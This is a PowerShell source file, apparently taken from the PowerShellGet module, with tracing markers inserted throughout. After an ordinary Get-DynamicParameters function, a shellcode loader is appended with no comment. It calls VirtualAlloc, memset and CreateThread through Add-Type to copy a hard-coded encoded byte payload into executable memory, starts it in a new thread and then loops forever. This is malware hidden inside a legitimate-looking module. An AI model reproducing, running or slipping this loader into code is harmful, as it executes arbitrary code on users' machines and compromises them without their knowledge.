 -||-> function Get-DynamicParameters
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Uri]
        $Location,

        [Parameter(Mandatory=$true)]
        [REF]
        $PackageManagementProvider
    )

     -||-> $paramDictionary =  -||-> New-Object System.Management.Automation.RuntimeDefinedParameterDictionary <-||-  <-||- 
     -||-> $dynamicOptions = $null <-||- 

     -||-> $loc =  -||-> Get-LocationString -LocationUri $Location <-||-  <-||- 

     -||-> if( -||-> -not $loc <-||- )
    {
        return  -||-> $paramDictionary <-||- 
    } <-||- 

    
     -||-> $loc =  -||-> Resolve-Location -Location $loc `
                            -LocationParameterName 'Location' `
                            -ErrorAction SilentlyContinue `
                            -WarningAction SilentlyContinue <-||-  <-||- 
     -||-> if( -||-> -not $loc <-||- )
    {
        return  -||-> $paramDictionary <-||- 
    } <-||- 

     -||-> $providers =  -||-> PackageManagement\Get-PackageProvider | Where-Object {  -||-> $_.Features.ContainsKey($script:SupportsPSModulesFeatureName) <-||-  } <-||-  <-||- 

     -||-> if ( -||-> $PackageManagementProvider.Value <-||- )
    {
        
         -||-> if( -||-> $PackageManagementProvider.Value -ne $script:PSModuleProviderName <-||- )
        {
             -||-> $SelectedProvider =  -||-> $providers | Where-Object { -||-> $_.ProviderName -eq $PackageManagementProvider.Value <-||- } <-||-  <-||- 

             -||-> if( -||-> $SelectedProvider <-||- )
            {
                 -||-> $res =  -||-> Get-PackageSource -Location $loc -Provider $PackageManagementProvider.Value -ErrorAction SilentlyContinue <-||-  <-||- 

                 -||-> if( -||-> $res <-||- )
                {
                     -||-> $dynamicOptions = $SelectedProvider.DynamicOptions <-||- 
                } <-||- 
            } <-||- 
        } <-||- 
    }
    else
    {
         -||-> $PackageManagementProvider.Value =  -||-> Get-PackageManagementProviderName -Location $Location <-||-  <-||- 
         -||-> if( -||-> $PackageManagementProvider.Value <-||- )
        {
             -||-> $provider =  -||-> $providers | Where-Object { -||-> $_.ProviderName -eq $PackageManagementProvider.Value <-||- } <-||-  <-||- 
             -||-> $dynamicOptions = $provider.DynamicOptions <-||- 
        } <-||- 
    } <-||- 

     -||-> foreach ($option in  -||-> $dynamicOptions <-||- )
    {
        
         -||-> if(  -||-> $option.IsRequired -and
            ( -||-> $option.Name -eq "Destination" <-||- ) <-||-  )
        {
            continue
        } <-||- 

         -||-> $paramAttribute =  -||-> New-Object System.Management.Automation.ParameterAttribute <-||-  <-||- 
         -||-> $paramAttribute.Mandatory = $option.IsRequired <-||- 

         -||-> $message = $LocalizedData.DynamicParameterHelpMessage -f ( -||-> $option.Name, $PackageManagementProvider.Value, $loc, $option.Name <-||- ) <-||- 
         -||-> $paramAttribute.HelpMessage = $message <-||- 

         -||-> $attributeCollection =  -||-> new-object System.Collections.ObjectModel.Collection[System.Attribute] <-||-  <-||- 
         -||-> $attributeCollection.Add($paramAttribute) <-||- 

         -||-> $ageParam =  -||-> New-Object System.Management.Automation.RuntimeDefinedParameter( -||-> $option.Name,
                                                                                    $script:DynamicOptionTypeMap[$option.Type.value__],
                                                                                    $attributeCollection <-||- ) <-||-  <-||- 
         -||-> $paramDictionary.Add($option.Name, $ageParam) <-||- 
    } <-||- 

    return  -||-> $paramDictionary <-||- 
} <-||- 
 -||-> $sjtb = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $sjtb -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xb8,0x93,0x93,0xe9,0x56,0xd9,0xec,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x83,0xc3,0x04,0x31,0x43,0x0f,0x03,0x43,0x9c,0x71,0x1c,0xaa,0x4a,0xf7,0xdf,0x53,0x8a,0x98,0x56,0xb6,0xbb,0x98,0x0d,0xb2,0xeb,0x28,0x45,0x96,0x07,0xc2,0x0b,0x03,0x9c,0xa6,0x83,0x24,0x15,0x0c,0xf2,0x0b,0xa6,0x3d,0xc6,0x0a,0x24,0x3c,0x1b,0xed,0x15,0x8f,0x6e,0xec,0x52,0xf2,0x83,0xbc,0x0b,0x78,0x31,0x51,0x38,0x34,0x8a,0xda,0x72,0xd8,0x8a,0x3f,0xc2,0xdb,0xbb,0x91,0x59,0x82,0x1b,0x13,0x8e,0xbe,0x15,0x0b,0xd3,0xfb,0xec,0xa0,0x27,0x77,0xef,0x60,0x76,0x78,0x5c,0x4d,0xb7,0x8b,0x9c,0x89,0x7f,0x74,0xeb,0xe3,0x7c,0x09,0xec,0x37,0xff,0xd5,0x79,0xac,0xa7,0x9e,0xda,0x08,0x56,0x72,0xbc,0xdb,0x54,0x3f,0xca,0x84,0x78,0xbe,0x1f,0xbf,0x84,0x4b,0x9e,0x10,0x0d,0x0f,0x85,0xb4,0x56,0xcb,0xa4,0xed,0x32,0xba,0xd9,0xee,0x9d,0x63,0x7c,0x64,0x33,0x77,0x0d,0x27,0x5b,0xb4,0x3c,0xd8,0x9b,0xd2,0x37,0xab,0xa9,0x7d,0xec,0x23,0x81,0xf6,0x2a,0xb3,0xe6,0x2c,0x8a,0x2b,0x19,0xcf,0xeb,0x62,0xdd,0x9b,0xbb,0x1c,0xf4,0xa3,0x57,0xdd,0xf9,0x71,0xcd,0xd8,0x6d,0x20,0xbf,0xc8,0x90,0xbc,0xbd,0x0e,0x7d,0x31,0x4b,0xe8,0xd1,0x19,0x1b,0xa5,0x91,0xc9,0xdb,0x15,0x79,0x00,0xd4,0x4a,0x99,0x2b,0x3e,0xe3,0x33,0xc4,0x97,0x5b,0xab,0x7d,0xb2,0x10,0x4a,0x81,0x68,0x5d,0x4c,0x09,0x9f,0xa1,0x02,0xfa,0xea,0xb1,0xf2,0x0a,0xa1,0xe8,0x54,0x14,0x1f,0x86,0x58,0x80,0xa4,0x01,0x0f,0x3c,0xa7,0x74,0x67,0xe3,0x58,0x53,0xfc,0x2a,0xcd,0x1c,0x6a,0x53,0x01,0x9d,0x6a,0x05,0x4b,0x9d,0x02,0xf1,0x2f,0xce,0x37,0xfe,0xe5,0x62,0xe4,0x6b,0x06,0xd3,0x59,0x3b,0x6e,0xd9,0x84,0x0b,0x31,0x22,0xe3,0x8d,0x0d,0xf5,0xcd,0xfb,0x7f,0xc5 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $uFp=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $uFp.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$uFp,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



